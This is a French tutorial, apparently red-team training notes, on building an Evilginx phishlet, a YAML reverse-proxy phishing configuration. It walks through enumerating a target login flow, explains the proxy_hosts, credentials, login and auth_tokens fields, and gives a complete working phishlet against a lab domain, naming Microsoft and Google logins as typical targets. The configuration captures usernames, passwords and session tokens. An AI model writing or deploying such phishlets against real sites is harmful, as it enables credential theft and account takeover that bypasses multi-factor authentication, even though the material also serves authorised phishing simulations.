Un **phishlet** est un **fichier de configuration YAML** qui définit comment intercepter et reproduire le comportement d’un site web cible pour voler des identifiants, des cookies ou des tokens d'authentification.

**Exemple typique :**

Un phishlet pour **login.microsoftonline.com** ou **accounts.google.com** configure Evilginx pour :

- Cloner l’interface de connexion,
- Intercepter les requêtes HTTP/S,
- Extraire les informations sensibles.

# Enumération

Avant même de crée notre phishlets nous devons énumérer notre site web cible, voir comment elle fonctionne et recueillir certaines informations.

- Aller dans la page de connexion du site web cible et crée un compte si vous n'a avez pas encore
- Une foie le compte crée, déconnectez vous
- Activer l'option `Network | Preserve log`  dans les outils de développements du navigateurs 
- Connectez vous a votre compte et récupérer les informations suivantes dans les requêtes envoyées :
	- Headers (`Request URL`, `Request Method`, `Content-Type`)
	- Payload (Données envoyer en POST)

# Création du phishlet

Une fois toutes les informations en main, faite une copie du fichier  `phishlets/example.yaml` pour votre campagne et nommer cette copie le même nom que votre site cible (ex: `akira.yaml`)

Les options les plus importante du fichier `yaml` sont:

- `proxy_hosts`: Contient la liste de tout les domaines que le site cible a besoin pour faire un proxy inverse cela inclus les sous-domaines et bien d'autres.
	- `domain`: Contient le domaine principale
	- `phish_sub` et `orig_sub`: Contiennent les sous-domaine lier au domaine principale
	- `session:true`: Indique le domaine contient des cookies de sessions
	- `is_landing:true`: Permet de rediriger un utilisateur vers la page d'origine

```yaml
{phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}
```

- `credentials`: Se sont les informations envoyer lors de la connexion au site (Présent dans la parti `Payload`) se sont des `key` qui doivent être remplacer en fonction de la requête envoyer

```yaml
credentials:
  username:
    key: 'email' # can change
    search: '(.*)'
    type: 'post'
  password:
    key: 'password' # can change
    search: '(.*)'
    type: 'post'
```

- `login`: Les informations ou envoyer notre campagne
       - `domain`: Contient le domaine connexion ceci peut être un sous-domaine aussi comme `login.target.com` | `akira.lab.evilginx.com` c'est le domaine responsable de recevoir les informions d'identifications par le formulaire 
    - `path`: Contient le chemin URL de login du site cible

```yaml
login:
  domain: 'akira.lab.evilginx.com'
  path: '/' # can be /login
```

- `auth_tokens`
    - `domain`: le domaine du cookie responsable de l'authentification 
    - `keys`: les noms des cookies, tokens a capturer

```yaml
auth_tokens:
  - domain: 'akira.lab.evilginx.com'
    keys: ['token']
```

---

Voici a quoi ressemble le fichier Phishlet de notre cible une fois terminer

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}

sub_filters:
#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}

auth_tokens:
  - domain: 'akira.lab.evilginx.com'
    keys: ['token']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'akira.lab.evilginx.com'
  path: '/'
```


> Chaque fois que vous faites une modification sur un phishlet redémarrer Evilginx 